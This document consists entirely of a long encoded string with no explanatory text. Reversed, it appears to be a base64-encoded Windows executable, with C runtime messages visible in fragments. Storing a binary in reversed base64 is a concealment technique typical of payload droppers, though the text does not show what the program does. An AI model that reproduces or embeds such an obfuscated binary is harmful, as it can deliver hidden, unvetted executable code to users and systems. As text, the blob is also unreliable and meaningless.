4iKmIiHaYhEOogBC4f+1Hf7pXe4dnd1R3cyFHcv5Wbstmaph2ZmVGZjJWYg9lXdx1W6lHe3ZXd0NncxB3bu1GbrpWaodmZlR2YiFGQ/4TP8sjO5gzN2UDNzITMw8iLtwyKqkCKnYSJkMiIhAyHe0BHboRGYchFVQxESEBEP4QDMsgCJgwBGUABDIQAA8v/9z/+6nP+3bf90Pv8xD/7u3O7rre6ofu5lT+4iHO4f7d3cvt2Zj91WXN1TLd0Q/szNz8yKnMyHbcxEPswBD8v+2Lv7qbu4ert1S7syGLsv6arsuqqpi6pmWKpjKaog+pndy5mamJmXaZlUOpkRC5jO2IjLqYiIeohFS4gCGIgAAAAAEQABIQACEgABIQACEgABIQACAAEBIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABEQABEQABEQABEQABEAAQEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEAAQAAEAABAQAAEAABAUAAEAABAQAAEAABAUAAFAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAASAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAABAQAAEAARACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIQACEgABIYACGggBIYACGggAABAQAAEAABAQAAEBEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQgBEYABGQgBEYABCAEAABAQAAEAABAQAAEAQIAECAhAQIAECAhAQIAECAhAQIAQAAEAABAQAAEAABAQAAEAABAQAAEAABAQAAEAABAIBAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAKAgCAoAAKAgGAgAAIAACAgAAIAACAgAAIAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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A6DKBdAXICFtI7LW1/LOMBkQ0iD/FCkQ0i2XXAqPYAHP4BIqAdSX4qzbAdCkewDI+gKvYwDAB4Bj8iBPACgHMyLafdBk+gBc8gHgY0rwAdDE+gZffMyRg+Dm/iXBAAMsS6FQHAQAAqM1zgOIHAAAAg6HoF1BMhIQCRKC8MpRn0FSAJMtIDkQ1iMzMzMzMzMPcXel1///ccob1B0BBAbSSN7wkdLm1///8goD1B0BBAbCSB7gkRLm1///cloD1B0BBAbyRB7QkRLm1///8poD1B0BBAbiRB7AkRLm1///cuoD1B0BBAbSRB7wjRLm1///8yoD1B0BBAbCRB7gjRLm1///c3oD1B0BBAayfB7QiRLm1///87oD1B0BBAaifB7AiRLm1//DdAoD1B0BBAaSfB7whRLm1//D9EoD1B0BBAaCfB7ghRLm1//DdJoD1B0BBAayeB7QhRLm1//D9NoD1B0BBAaieB7AhRLm1//DdSoD1B0BBAaSeB7wgRLCAAAoOhPYfhIU3iWx+iV9/iD3lXZ9//Q/G6WdAdQAwmMUzO0Y3iZ9//QHI6QdAdQAwmIUwOwY0iZ9//QPJ6QdAdQAgmgXwOIY0iZ9//QXK6QdAdQAgmcXwOEY0iZ9//QfL6QdAdQAgmYXwOGsYW0ZfhIU3iWx+iV9/iD3lXYQ8g//P0ajOAAEAY2+///Dd5oDAABwlt////QDP6AAQAYZ7///P07jOAAEAV2+///HtBoDAABAlt////RHB6AAQAMZ7/AR8g//f0fgOAAEAS2+///HtKoDAABQkt////RXD6AAQAAZ7///f0AhOAAEAP2+///H9SoDAABgjt////RbF6AAQA0Y7///f0hhOAAEAM2+///HNboDAABwit////RfH6AAQAoY7///f0CiOAAEAJ2+///HdjoDAABAit////RjJ6AAQAcY7///f0jiOAAEAG2+///HtroDAABQht////RnL6AAQAQY7///f0EjOAAEAD2+PQEP4//Ht0oDAABggt////R3N6AAQAEY7///f0ojOAAEAA2+///H98oDAAAwvt////R7P6AAAA4b7///v0JgOAAAA92+///LNFoDAAAAvt////S/B6AAAAUb7///v0qgOAAAA72+///LdNoDAAAgut////SDE6AAAAkb7///v0LhOAAAA42+///LtVoDAAAwtt////SHG6AAAAYb7///v0shOAAAAu2+///L9doDAAAAtt/DExD+//SXI6AAAAMb7///v0QiOAAAAy2+///L9moDAAAQst////SbK6AAAAAb7///v0xiOAAAAv2+///LNvoDAAAgqt////SfM6AAAAka7///v0SjOAAAAo2+///Ld3oDAAAwpt////SjO6AAAAYa7///v0zjOAAAAl2+///Lt/oDAAAApt////TnA6AAAAMa7////0UgOAAAAi2+///P9HoDAAAQot////TrC6AAAAAa7/AR8g///04gOf29///PNQojnd////TjE60Z3////0QhOc29///PNWozmd////TDG6oZ3////0ohOZ29///PNcoDmd////TjH6cZ3////0AiOW29///PNioTld////TDJ6QZ3////0YiOT29///PNoojkd////TjK6EZ3////0wiOQ29PQEP4//P9uozjd////TPM64Y3////0LjOH29///P90oTjd////TvN6wY3////0jjOL29///P96ojid////TPP6kY3////07jOI29///T9Aobz///P1KgOG29///TtEoThd////UrB6QY3///P1igOD29///TtKojgd////ULD6EY3/AAwAjR4D2XIC1toVsvYV/v4wdBBAgBeF/DBAgCSN/DgaIU3/D31/IP4//jvloDAAAYBAH///zjG6VUHAI03gsvYV/vIirLQwD2LdkrQx1FQY6YMdArgz1FgOCI8gCsoZkSHAAAgACfP30BsCBE8gnXXA6EgwDKgiYQHAAAQACf/wBA8ggHNwbA5wAPz/LKddkrABCPIBBPIE1NQY6EBdArQG1JQQ6AB6B3BdkrQJ1FQY6YCdArgL1FgOCsIP1BAAAMgw3jAJMtIBkQ1iMzMzMzMzMzMzMzMzMz8wZ9//o7B6OoWxrD9iD///gHD6AAAAKg+///v/8X0xAQgZDm1//XNOoTgd/n1//XdQoDFBKlIBItIL1hQORQHwFSeRJCBAnCuuQAwpkH6L0lchE40iIU3iAwfZDm1//nuUo7ga//P4ChOEAQIAoxgaAggwdxAxD+//+XL6UQCd/HlUIQCbLW1wdtlXfBAAWwJ6RBBAEZJaSBgaXZ1UsvYVm///zI9MJPz2zA8MAAgEPieAqF8ixvo6LOcXe91WR///zY/MSPz2zA8Mqv4UXZVVAQgwdxAxD+///XB6oE3/YE3/cE3/psICkw0iVNMAAAwA4KQiQQCVLiAJEtYXMQ8g////+gOFw9PEw9PDw9PGotYV//PzYjOyzgASLiAJEt4M0BAAAEAuAAAAGQQQ3TAJMt4wb51XYQ8gAAAAAUwjkB76AAwEEhOCDtIAAAQA5CAATID6IM0iAAQABgGz1BAB7NIDIl4CLCxsc1od00oL2J/OEQn/6PINkQ1i7Qn/+PIDwtYGzwCJMtICYtIMkQ0iAAAAAUSikhAJElIxzABAQCQoAAAAAUz/kBBADBPaRFFUS